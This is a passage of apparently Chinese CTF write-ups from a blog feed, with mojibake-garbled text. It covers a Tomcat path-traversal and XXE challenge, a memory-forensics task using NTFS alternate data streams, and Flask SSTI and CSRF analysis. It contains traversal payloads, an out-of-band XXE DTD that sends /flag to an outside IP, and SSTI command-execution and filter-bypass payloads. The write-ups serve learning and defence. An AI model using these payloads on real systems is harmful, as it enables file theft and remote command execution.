href="#java-file" class="headerlink" title="java file"></a>java file</h1><p>è¿™é“é¢˜æ‹¿åˆ°æ‰‹æ²¡ä»€ä¹ˆæ€è·¯ï¼Œçœ‹äº†å¸ˆå‚…ä»¬çš„wpç»§ç»­åšï¼ŒçŸ¥é“äº†æ˜¯ç›®å½•ç©¿è¶Šã€‚<br>é¦–å…ˆæ˜ç™½tomcatéƒ¨ç½²é¡¹ç›®çš„æ–‡ä»¶ç»“æ„ï¼š<br>éƒ¨ç½²åœ¨webappsæ–‡ä»¶å¤¹ä¸‹ï¼Œå…¶ä¸‹æ¯ä¸ªæ–‡ä»¶å¤¹ä»£è¡¨ä¸€ä¸ªé¡¹ç›®ã€‚</p><img src="http://cdn.polowong.top/static/images/tomcat.jpg"><p>classesæ–‡ä»¶å¤¹ä¸‹å­˜æ”¾åŸºæœ¬ç±»ï¼Œservletç­‰æ–‡ä»¶ã€‚<br>é¦–å…ˆéšä¾¿ä¼ ä¸ªæ–‡ä»¶ï¼Œå‘ç°äº†servletçš„åå­—ã€‚<br>é¦–å…ˆè¦è·å–web.xmlæ–‡ä»¶ï¼Œçœ‹çœ‹æ–‡ä»¶ç»“æ„æ˜¯æ€æ ·çš„ï¼Œç„¶åå†æŠŠå¯¹åº”çš„ä¸œè¥¿ä¸‹è½½ä¸‹æ¥<br>ä½¿ç”¨../ä¸æ–­è¿”å›ä¸Šçº§ç›®å½•ï¼Œæœ€åæ˜¯/web.xml<br>payload:DownloadServlet?filename=../../../web.xml<br>ä¸‹è½½ä¸‹æ¥ä¹‹åå‘ç°äº†å‡ ä¸ªservletæ–‡ä»¶ï¼Œå¯¹åº”åº”è¯¥æ˜¯classes/xxxx.servlet.classï¼ˆæ³¨æ„å‰é¢è¿˜æœ‰åŒ…åï¼‰<br>ä¸‹è½½servlet.classæ–‡ä»¶ï¼špayload:<br>?filename=../../../classes/cn/abc/servlet/UploadServlet.class<br>è¿™æ ·å­æŠŠå››ä¸ªservletä¸‹è½½ä¸‹æ¥ï¼Œç„¶ååç¼–è¯‘é˜…è¯»æºç </p><img src="http://cdn.polowong.top/static/images/tomcat1.jpg"><p>è¿™æ˜¯ä¸‹è½½çš„servletï¼Œæ³¨æ„çœ‹è¿‡æ»¤äº†flagï¼Œä¸èƒ½é€šè¿‡ç›®å½•ç©¿è¶Šç›´æ¥ç©¿è¶Šåˆ°æ ¹ç›®å½•ä¸‹è½½flagæ–‡ä»¶ã€‚<br>ç»§ç»­çœ‹ä¸Šä¼ servletï¼Œ<br>å…³é”®ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (filename.startsWith(<span class="string">&quot;excel-&quot;</span>) &amp;&amp; <span class="string">&quot;xlsx&quot;</span>.equals(fileExtName)) &#123;</span><br><span class="line">                                <span class="keyword">try</span> &#123;</span><br><span class="line">                                    Workbook wb1 = WorkbookFactory.create(in);</span><br><span class="line">                                    Sheet sheet = wb1.getSheetAt(<span class="number">0</span>);</span><br><span class="line">                                    System.out.println(sheet.getFirstRowNum());</span><br><span class="line">                                &#125; <span class="keyword">catch</span> (InvalidFormatException var20) &#123;</span><br><span class="line">                                    System.err.println(<span class="string">&quot;poi-ooxml-3.10 has something wrong&quot;</span>);</span><br><span class="line">                                    var20.printStackTrace();</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯èƒ½å­˜åœ¨XXEæ¼æ´ï¼Œé‚æµ‹è¯•ã€‚<br>excelæ–‡ä»¶éœ€è¦ä»¥excel-å¼€å¤´ã€‚<br>ç”±äºæ˜¯åœ¨buuojå¤ç°ï¼Œæ‰€ä»¥ä¸å¯ä»¥ç”¨å¤–ç½‘vpsï¼Œåªèƒ½ç”¨å†…ç½‘vpsï¼Œç”¨å¦å¤–ä¸€ä¸ªå·å†å¼€ä¸€ä¸ªsshè¿ç€ã€‚ã€‚ã€‚å¡äº†ä¿©å°æ—¶<br>XXEæˆ‘ä¹Ÿä¸æ˜¯å¾ˆäº†è§£ï¼Œåç»­ä¼šç»§ç»­å­¦ä¹ ã€‚<br>è¿™é‡Œè·Ÿç€å¸ˆå‚…ä»¬å…ˆå¤ç°ï¼š<br>å¤§ä½“æ€è·¯å°±æ˜¯xmlæ–‡ä»¶åŠ è½½å¤–éƒ¨å®ä½“ï¼ŒåŠ è½½çš„å¤–éƒ¨å®ä½“é‡Œé¢ä¼šâ€åŒ…å«â€ï¼ˆæˆ‘æ˜¯è¿™ä¹ˆç†è§£çš„ï¼‰æœ¬åœ°flagæ–‡ä»¶ï¼Œç„¶åå‘vpså‘é€ä¸€ä¸ªè¯·æ±‚ï¼Œå‚æ•°æŠŠflagæ–‡ä»¶å¸¦å‡ºå»ã€‚<br>dtdæ–‡ä»¶ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#39;http:&#x2F;&#x2F;174.1.87.39:8888&#x2F;?%file;&#39;&gt;&quot;&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure><p>xmlä¸­æ–°æ·»åŠ çš„å†…å®¹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE data SYSTEM &quot;http:&#x2F;&#x2F;174.1.87.39&#x2F;1.dtd&quot;&gt;</span><br><span class="line">&lt;data&gt;&amp;send;&lt;&#x2F;data&gt;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸ªå‘ å°±æ˜¯åœ¨Windowsç³»ç»Ÿä¸‹ä¸è¦è§£å‹ï¼Œç›´æ¥ä¿®æ”¹åç¼€ç„¶åç”¨360å‹ç¼©åœ¨å‹ç¼©æ–‡ä»¶å†…ä¿®æ”¹ï¼Œå†æŠŠæ‰©å±•åæ”¹å›å»ã€‚<br>æ”¹å¥½ä¹‹åæœåŠ¡å™¨ç›‘å¬ç«¯å£ï¼Œä¸Šä¼ æ–‡ä»¶ã€‚</p><img src="http://cdn.polowong.top/static/images/tomcat2.jpg"><p>ç»“æŸã€‚</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>XXEä¸å¤ªç†Ÿï¼Œéœ€è¦å†å­¦ä¹ ï¼Œç›®å½•ç©¿è¶Šæƒ³åˆ°äº†ï¼Œä½†æ˜¯æ²¡æˆåŠŸåˆ©ç”¨ï¼Œå†æœ‰å°±æ˜¯æˆ‘çœ‹çš„ç›®å½•ç»“æ„çœ‹çš„æ˜¯java webé¡¹ç›®çš„ç›®å½•ç»“æ„ï¼Œè€Œä¸æ˜¯tomcatéƒ¨ç½²çš„ç›®å½•ç»“æ„ï¼Œæ‰€ä»¥ä¹Ÿæ²¡åˆ©ç”¨æˆåŠŸã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> buuoj </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF-misc</title>
      <link href="2020/05/14/DASCTF-misc/"/>
      <url>2020/05/14/DASCTF-misc/</url>
      
        <content type="html"><![CDATA[<h2 id="DASCTF-MISC-å†…å­˜å–è¯"><a href="#DASCTF-MISC-å†…å­˜å–è¯" class="headerlink" title="DASCTF-MISC-å†…å­˜å–è¯"></a>DASCTF-MISC-å†…å­˜å–è¯</h2><p>å‚è€ƒé“¾æ¥<br><a href="http://www.fzwjscj.xyz/index.php/archives/25/">http://www.fzwjscj.xyz/index.php/archives/25/</a><br>é¦–å…ˆä½¿ç”¨volatility åˆ†ææ“ä½œç³»ç»Ÿç‰ˆæœ¬ï¼Œç„¶åè¿‡æ»¤æ–‡ä»¶ï¼Œå°†å…¶dumpå‡ºæ¥ã€‚</p><img src="http://cdn.polowong.top/static/images/das1.jpg"><p>è¿™æ˜¯dumpå‡ºæ¥çš„å†…å®¹<br>é€šè¿‡åˆ†æå‘ç°åœ¨ctf-wikiä¸Šæ˜¯ABCåŠ å¯†ï¼ŒQWEå¯¹åº”ç€ABCï¼Œç„¶åå¯†æ–‡æ˜¯CTKQEKNHZHQLLVGKROLATNWGQKRRKQGWNTA<br>å°†å…¶è§£å¯†åç»“æœä¸ºveracryptpasswordiskeyboarddraobyek<br>åŒæ—¶æç¤ºå¯†ç æ˜¯å¤§å†™çš„ï¼Œæ‰€ä»¥å¯†ç åº”è¯¥æ˜¯KEYBOARDDRAOBYEK<br>ç„¶åä½¿ç”¨veracryptåŠ è½½secretï¼Œè¾“å…¥å¯†ç ä¹‹åæœ‰ä¸ªvhdæ–‡ä»¶ï¼Œå¯ä»¥ç›´æ¥å³é”®æŒ‚è½½ã€‚<br>ä½†æ˜¯é‡Œé¢çš„flagæ˜¯å‡çš„ã€‚ã€‚ç”¨010editorä¹Ÿæ²¡çœ‹å‡ºæ¥ä»€ä¹ˆç«¯å€ªï¼Œå‚è€ƒwpåæ‰çŸ¥é“æ˜¯NTFSéšå†™ã€‚<br>ä½¿ç”¨ntfsstreamseditoræ‰“å¼€åå¯ä»¥çœ‹åˆ°éšå†™çš„å†…å®¹flag{4a02f6dc603c377a234df479609d237c}</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>é¦–å…ˆæ˜¯æ²¡æ‰¾åˆ°txtæ–‡ä»¶ï¼Œå…¶æ¬¡æ˜¯ä¸çŸ¥é“åŠ å¯†æ–¹å¼ï¼Œå†åˆ°åé¢æ˜¯æ²¡æƒ³åˆ°NTFSéšå†™ã€‚ã€‚è¿™é“é¢˜ã€‚ã€‚è‡ªå·±åšæ˜¯åšä¸å‡ºæ¥<br>ä½†æ˜¯ä¹Ÿå­¦ä¹ åˆ°äº†NTFSéšå†™è¿™ç§æ“ä½œã€‚<br>å‚è€ƒé“¾æ¥ï¼š<a href="https://www.cnblogs.com/Chesky/p/ALTERNATE_DATA_STREAMS.html">https://www.cnblogs.com/Chesky/p/ALTERNATE_DATA_STREAMS.html</a><br>åœ¨NTFSæ–‡ä»¶ç³»ç»Ÿä¸­å­˜åœ¨ç€NTFSäº¤æ¢æ•°æ®æµï¼ˆAlternate Data Streamsï¼Œç®€ç§°ADSï¼‰ï¼Œè¿™æ˜¯NTFSç£ç›˜æ ¼å¼çš„ç‰¹æ€§ä¹‹ä¸€ã€‚æ¯ä¸€ä¸ªæ–‡ä»¶ï¼Œéƒ½æœ‰ç€ä¸»æ–‡ä»¶æµå’Œéä¸»æ–‡ä»¶æµï¼Œä¸»æ–‡ä»¶æµèƒ½å¤Ÿç›´æ¥çœ‹åˆ°ï¼›è€Œéä¸»æ–‡ä»¶æµå¯„å®¿äºä¸»æ–‡ä»¶æµä¸­ï¼Œæ— æ³•ç›´æ¥è¯»å–ï¼Œè¿™ä¸ªéä¸»æ–‡ä»¶æµå°±æ˜¯NTFSäº¤æ¢æ•°æ®æµã€‚<br>ç®€å•åœ°è¯´å°±æ˜¯å¯ä»¥éšè—æ–‡ä»¶ï¼ˆå›¾ç‰‡è§†é¢‘å¯æ‰§è¡Œæ–‡ä»¶ï¼‰å¹¶ä¸”æ­£å¸¸æƒ…å†µä¸‹çœ‹ä¸åˆ°ã€‚<br>å¯ä»¥ä½¿ç”¨typeå‘½ä»¤å°†éœ€è¦éšè—çš„æ–‡ä»¶é™„åŠ ä¸Šå»ã€‚å¦‚type â€œhidden.jpgâ€ &gt; â€œtarge.jpgâ€:â€hidden.jpgâ€</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>flask&amp;ssti&amp;csrf</title>
      <link href="2020/05/14/flask-ssti-csrf/"/>
      <url>2020/05/14/flask-ssti-csrf/</url>
      
        <content type="html"><![CDATA[<h1 id="æœ€è¿‘â€é—²çš„â€æ²¡äº‹ç ”ç©¶äº†ä¸€ä¸‹flaskæ¡†æ¶çš„é˜²æŠ¤é—®é¢˜ï¼Œä¸»è¦æ˜¯sstiä¸csrfã€‚"><a href="#æœ€è¿‘â€é—²çš„â€æ²¡äº‹ç ”ç©¶äº†ä¸€ä¸‹flaskæ¡†æ¶çš„é˜²æŠ¤é—®é¢˜ï¼Œä¸»è¦æ˜¯sstiä¸csrfã€‚" class="headerlink" title="æœ€è¿‘â€é—²çš„â€æ²¡äº‹ç ”ç©¶äº†ä¸€ä¸‹flaskæ¡†æ¶çš„é˜²æŠ¤é—®é¢˜ï¼Œä¸»è¦æ˜¯sstiä¸csrfã€‚"></a>æœ€è¿‘â€é—²çš„â€æ²¡äº‹ç ”ç©¶äº†ä¸€ä¸‹flaskæ¡†æ¶çš„é˜²æŠ¤é—®é¢˜ï¼Œä¸»è¦æ˜¯sstiä¸csrfã€‚</h1><p>10å·å‰ä¸€ç›´åœ¨æç”¨flaskå†™çš„bmsï¼Œç®—æ˜¯è’åºŸæ‰äº†ã€‚ã€‚<br>å…ˆè¯´ä¸€å¥åºŸè¯ï¼Œä¸ƒç‰›CDNæœ‰ä¸ªæµ‹è¯•åŸŸåï¼Œä¸€æ®µæ—¶é—´åå¤±æ•ˆï¼Œå¤±æ•ˆåéœ€è¦æ›¿æ¢ä¸ºè‡ªå·±å¤‡æ¡ˆåçš„åŸŸåè¿›è¡ŒCDNåŠ é€Ÿï¼Œåœ¨è¿™é‡Œå‡ºç°äº†ä¸€ä¸ªé—®é¢˜ï¼Œåœ¨hexoä¸»é¢˜é…ç½®æ–‡ä»¶å°†URLæ¢ä¸ºè‡ªå·±çš„CDNåŸŸååï¼Œç”¨ä¹‹å‰çš„åŸŸåä¸Šä¼ çš„å›¾ç‰‡å°±æ‰¾ä¸åˆ°äº†ï¼ˆå› ä¸ºä¹‹å‰çš„åŸŸåå·²ç»è¢«åºŸå¼ƒï¼Œæ— æ³•è§£æï¼‰<br>è¿™æ—¶å€™å¯ä»¥ hexo clean ç„¶å hexo gï¼Œé‡æ–°æŠŠmdæ–‡ä»¶æ¸²æŸ“æˆhtmlæ–‡ä»¶ï¼Œè¿™æ ·é‡Œé¢äº§ç”Ÿçš„å›¾ç‰‡é“¾æ¥çš„URLå‰ç¼€å°±æ˜¯æˆ‘ä»¬æ–°é…ç½®çš„CDNåŸŸåã€‚</p><h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><p><a href="https://mp.weixin.qq.com/s/Lj4nCz0hag-AKQF_s79fQw">https://mp.weixin.qq.com/s/Lj4nCz0hag-AKQF_s79fQw</a><br><a href="https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/#%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%A6%82%E8%BF%B0">https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/#%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%A6%82%E8%BF%B0</a><br><a href="https://xz.aliyun.com/t/6885">https://xz.aliyun.com/t/6885</a><br><a href="http://shaobaobaoer.cn/archives/660/python-flask-jinja-ssti">http://shaobaobaoer.cn/archives/660/python-flask-jinja-ssti</a><br><a href="https://www.anquanke.com/post/id/188172">https://www.anquanke.com/post/id/188172</a></p><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><p>sstiå°±æ˜¯æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ï¼ˆServer Side Template Injectionï¼‰<br>æ¨¡æ¿æŒ‡çš„æ˜¯ç°æˆå†™å¥½çš„ä¸œè¥¿ï¼Œåªéœ€è¦ä¼ å…¥ä¸€äº›å˜é‡åˆ°æ¨¡æ¿ï¼Œç„¶åæ¸²æŸ“æˆhtmlé¡µé¢ã€‚æ¨¡æ¿æ˜¯å†™å¥½çš„ï¼Œè€Œå˜é‡æ˜¯æ¯æ¬¡éœ€è¦ä¼ å…¥çš„ã€‚<br>ä¸æ­£ç¡®åœ°ä½¿ç”¨æ¨¡æ¿å¼•æ“è¿›è¡Œæ¸²æŸ“æ—¶ï¼Œä¼šå‡ºç°SSTIæ¼æ´ã€‚ï¼ˆjinja2ï¼‰<br>åœ¨flaskä¸­ï¼Œä½¿ç”¨jinja2æ¨¡æ¿æ¸²æŸ“å¼•æ“ï¼Œæœ‰ä¸¤ç§æ¸²æŸ“æ¨¡æ¿çš„æ–¹æ³•ï¼šrender_template()å’Œrender_template_string()ï¼Œä¸¤ç§æ–¹æ³•çš„åŒºåˆ«æ˜¯ç¬¬ä¸€ç§æŒ‡å®šä¸€ä¸ªæ¨¡æ¿æ–‡ä»¶(.html)ï¼Œç¬¬äºŒç§åˆ™è§„å®šäº†éœ€è¦ä¼ å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼ŒæŠŠhtmlä»£ç å†™åˆ°å­—ç¬¦ä¸²ä¸­ã€‚<br>å‡ºç°é—®é¢˜çš„æ˜¯ç¬¬äºŒç§æ¸²æŸ“æ–¹å¼ï¼ˆæˆ‘å†™bmsçš„æ—¶å€™ç”¨çš„æ˜¯ç¬¬ä¸€ç§ã€‚ã€‚æœ¬æ¥æƒ³å†™å†™é˜²å¾¡æ¥ç€ï¼Œä½†æ˜¯æ ¹æœ¬ä¸å­˜åœ¨åˆ©ç”¨ç‚¹ï¼‰ï¼Œå½“æ˜¾ç¤ºæ–¹å¼ä¸ºç›´æ¥è·å–å˜é‡æ—¶ï¼Œå¦‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">person[<span class="string">&#x27;name&#x27;</span>]=request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">hello ,&#123;&#123;person.name&#125;&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ ·çš„è¯ä¼ å…¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name&#x3D;&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure><p>çš„è¯æ˜¾ç¤ºçš„å°±æ˜¯7*7ï¼Œå› ä¸ºè¿™æ ·ä¼šæŠŠä¼ å…¥çš„å†…å®¹å½“ä½œå­—ç¬¦ä¸²è¿›è¡Œå¤„ç†ï¼Œè€Œéæ¨¡æ¿è¯­å¥ã€‚<br>å¦‚æœæ˜¯è¿™æ ·ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">person[&#39;name&#39;]&#x3D;request.args.get(&#39;name&#39;)</span><br><span class="line">hello ,%s %person[&#39;name&#39;]</span><br></pre></td></tr></table></figure><p>é€šè¿‡å­—ç¬¦ä¸²æ ¼å¼åŒ–çš„æ–¹å¼ä¼ å…¥å†…å®¹ï¼Œæ¨¡æ¿è¯­å¥ä¼šè¢«è§£é‡Šæ‰§è¡Œã€‚</p><h3 id="SSTIåˆ©ç”¨"><a href="#SSTIåˆ©ç”¨" class="headerlink" title="SSTIåˆ©ç”¨"></a>SSTIåˆ©ç”¨</h3><p>ä»»ä½•æ¼æ´çš„ç›®çš„æ˜¯å®ç°ä¸ªäººæ„å›¾ï¼Œæ¯”å¦‚getshellï¼Œè¯»å–æ–‡ä»¶ã€‚<br>å¯¹äºSSTIçš„åˆ©ç”¨ï¼Œæˆ‘é‡åˆ°çš„ä¸»è¦æ˜¯é€šè¿‡è·å¾—configé‡Œé¢çš„secret keyè¿›è¡Œä¼ªé€ sessionï¼Œæ¨¡æ‹Ÿç®¡ç†å‘˜ç™»å½•ï¼›æˆ–è€…é€šè¿‡å®ä¾‹åŒ–osåå¼¹shellï¼Œæˆ–è€…é€šè¿‡fileã€openå¯¹è±¡è¿›è¡Œæ–‡ä»¶è¯»å–ã€‚<br>__class__è·å–å½“å‰å®ä¾‹çš„å¯¹è±¡ï¼Œ__mro__è·å¾—çˆ¶ç±»é“¾ï¼Œ__subclasses__è·å¾—å½“å‰ç±»æ‰€æœ‰çš„å­ç±»ï¼Œ__init__å®ä¾‹åŒ–ä¸€ä¸ªç±»ï¼Œ__globals__è·å–æ‰€æœ‰å¯ç”¨çš„æ–¹æ³•ä¸å˜é‡ã€‚<br>ä¸¾ä¾‹ï¼š<br>å‘½ä»¤æ‰§è¡Œï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[300].__init__.__globals__[&quot;os&quot;][&quot;popen&quot;](&quot;whoami&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="è¿‡æ»¤ä¸ç»•è¿‡"><a href="#è¿‡æ»¤ä¸ç»•è¿‡" class="headerlink" title="è¿‡æ»¤ä¸ç»•è¿‡"></a>è¿‡æ»¤ä¸ç»•è¿‡</h3><h4 id="è¿‡æ»¤å¼•å·"><a href="#è¿‡æ»¤å¼•å·" class="headerlink" title="è¿‡æ»¤å¼•å·"></a>è¿‡æ»¤å¼•å·</h4><p>request.argsæ˜¯Flaskä¸­çš„ä¸€ä¸ªå±æ€§ï¼Œä¸ºè¿”å›è¯·æ±‚çš„å‚æ•°ï¼Œè¿™é‡ŒæŠŠpathå½“ä½œå˜é‡åï¼Œå°†åé¢çš„è·¯å¾„ä¼ å€¼è¿›æ¥ï¼Œè¿›è€Œç»•è¿‡äº†å¼•å·çš„è¿‡æ»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name&#x3D;&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()&#125;&#125;&amp;path&#x3D;&#x2F;tmp&#x2F;cmd.py</span><br></pre></td></tr></table></figure><h4 id="è¿‡æ»¤åŒä¸‹åˆ’çº¿"><a href="#è¿‡æ»¤åŒä¸‹åˆ’çº¿" class="headerlink" title="è¿‡æ»¤åŒä¸‹åˆ’çº¿"></a>è¿‡æ»¤åŒä¸‹åˆ’çº¿</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name&#x3D;&#123;&#123;&#39;&#39;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#125;&#125;&amp;class&#x3D;__class__&amp;mro&#x3D;__mro__&amp;subclasses&#x3D;__subclasses__</span><br></pre></td></tr></table></figure><h4 id="è¿‡æ»¤ä¸­æ‹¬å·"><a href="#è¿‡æ»¤ä¸­æ‹¬å·" class="headerlink" title="è¿‡æ»¤ä¸­æ‹¬å·"></a>è¿‡æ»¤ä¸­æ‹¬å·</h4><p>é¦–å…ˆæ˜ç™½ä¸­æ‹¬å·æ˜¯ä»€ä¹ˆä½œç”¨ï¼šä»å­—å…¸ä¸­å–å€¼ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">globals[&quot;os&quot;]&#x3D;&#x3D;globals.os æ‰€ä»¥å¯ä»¥ç”¨__getitem__ç»•è¿‡ã€‚</span><br></pre></td></tr></table></figure><h4 id="è¿‡æ»¤ç‚¹å·"><a href="#è¿‡æ»¤ç‚¹å·" class="headerlink" title="è¿‡æ»¤ç‚¹å·"></a>è¿‡æ»¤ç‚¹å·</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__ç­‰ä»·äº&quot;&quot;[&quot;__class__&quot;]</span><br></pre></td></tr></table></figure><h4 id="å…³é”®è¯è¿‡æ»¤"><a href="#å…³é”®è¯è¿‡æ»¤" class="headerlink" title="å…³é”®è¯è¿‡æ»¤"></a>å…³é”®è¯è¿‡æ»¤</h4><p>æ€è·¯æ˜¯è¿›è¡Œæ‹¼æ¥ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__getattribute__(&quot;__cla&quot;+&quot;ss__&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="SSTIé˜²å¾¡"><a href="#SSTIé˜²å¾¡" class="headerlink" title="SSTIé˜²å¾¡"></a>SSTIé˜²å¾¡</h3><p>é¦–å…ˆæ˜¯å°½é‡ä¸ä½¿ç”¨render_template_string(),å¦‚æœç”¨çš„è¯ï¼Œå°½é‡ä¸ä½¿ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„å½¢å¼ï¼›å¦‚æœå¿…é¡»ä½¿ç”¨çš„è¯ï¼Œè¦å»ºç«‹ç›¸å¯¹å¼ºçš„è¿‡æ»¤è§„åˆ™ï¼Œå°¤å…¶æ˜¯å¯¹å°æ‹¬å·çš„è¿‡æ»¤ï¼Œè¿‡æ»¤å°æ‹¬å·åå°±å¾ˆéš¾æ‰§è¡Œå‘½ä»¤äº†ã€‚<br>å¯¹äºå…³é”®è¯è¿‡æ»¤ï¼Œæˆ‘çš„æ€è·¯æ˜¯è¿›è¡Œé¢„å¤„ç†ï¼Œå°†æ¥æ”¶åˆ°çš„å­—ç¬¦ä¸²ä¸­çš„å¼•å·ï¼ŒåŠ å·ç­‰ç‰¹æ®Šç¬¦å·æ­£åˆ™åŒ¹é…å»æ‰åå†è¿›è¡Œé»‘åå•åŒ¹é…ã€‚</p><h2 id="flask-csrfåˆ†æ"><a href="#flask-csrfåˆ†æ" class="headerlink" title="flask csrfåˆ†æ"></a>flask csrfåˆ†æ</h2><h3 id="å¼€å£å°±æ˜¯è€csrfäº†ï¼Œå…ˆåˆ†æåˆ†ææºç "><a href="#å¼€å£å°±æ˜¯è€csrfäº†ï¼Œå…ˆåˆ†æåˆ†ææºç " class="headerlink" title="å¼€å£å°±æ˜¯è€csrfäº†ï¼Œå…ˆåˆ†æåˆ†ææºç "></a>å¼€å£å°±æ˜¯è€csrfäº†ï¼Œå…ˆåˆ†æåˆ†ææºç </h3><p>é¦–å…ˆ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CSRFProtect(app)</span><br></pre></td></tr></table></figure><p>ï¼Œè·Ÿè¿›CSRFProtect</p><img src="http://cdn.polowong.top/static/images/csrf1.jpg"><p> ç„¶åæœ‰ä¸€ä¸ªapp.before_requestä¿®é¥°çš„æ–¹æ³•ï¼Œè¯´æ˜åœ¨è¯·æ±‚å‰æ‰§è¡Œã€‚<br> è¯¥æ–¹æ³•è¿›è¡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.protect()</span><br></pre></td></tr></table></figure><p> è·Ÿè¿›self.protect()<br> ä½¿ç”¨æ–¹æ³•validate_csrfå°è¯•éªŒè¯tokençš„æ­£ç¡®æ€§ï¼Œtokenä¸ºself._get_csrf_token</p><img src="http://cdn.polowong.top/static/images/csrf2.jpg"><img src="http://cdn.polowong.top/static/images/csrf3.jpg"><img src="http://cdn.polowong.top/static/images/csrf4.jpg"><img src="http://cdn.polowong.top/static/images/csrf5.jpg"><p>å…¶å®å¯¹URLSafeTimedSerializerè¿™ä¸ªæˆ‘ä¸æ˜¯å¤ªç†Ÿæ‚‰ï¼Œæˆ‘å¯¹ä»–çš„ç†è§£æ˜¯äº§ç”Ÿä¸€ä¸ªsessionï¼ŒsessionåŒ…æ‹¬ä¸‰ä¸ªå­—æ®µï¼Œbase64åŠ å¯†çš„æ•°æ®å­—æ®µï¼Œtimestampï¼Œç­¾åã€‚<br>ç„¶åäº§ç”Ÿçš„tokenå°±æ˜¯è·å–åºåˆ—åŒ–åçš„sessionçš„æ•°æ®å­—æ®µçš„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session[field_name]</span><br></pre></td></tr></table></figure><p>ä¸­çš„æ•°æ®ã€‚</p><h3 id="ç”Ÿå‘½æµç¨‹"><a href="#ç”Ÿå‘½æµç¨‹" class="headerlink" title="ç”Ÿå‘½æµç¨‹"></a>ç”Ÿå‘½æµç¨‹</h3><p>ç¬¬ä¸€æ¬¡è®¿é—®ï¼Œäº§ç”Ÿsessionä¸tokenï¼Œè®¾ç½®è¿‡æœŸæ—¶é—´<br>ç¬¬äºŒæ¬¡åŒ…æ‹¬ä»¥åçš„è®¿é—®åœ¨å¤´éƒ¨æˆ–è€…è¡¨å•ä¸­æºå¸¦tokenï¼Œè®¿é—®å‰è¿›è¡ŒéªŒè¯ï¼ŒéªŒè¯é€šè¿‡åˆ™å…è®¸è®¿é—®ã€‚é™¤äº†tokenå¤–è¿˜æœ‰è¯·æ±‚å¤´ï¼ŒåŒæºç­–ç•¥ç­‰éªŒè¯</p><h3 id="CSRFé˜²æŠ¤"><a href="#CSRFé˜²æŠ¤" class="headerlink" 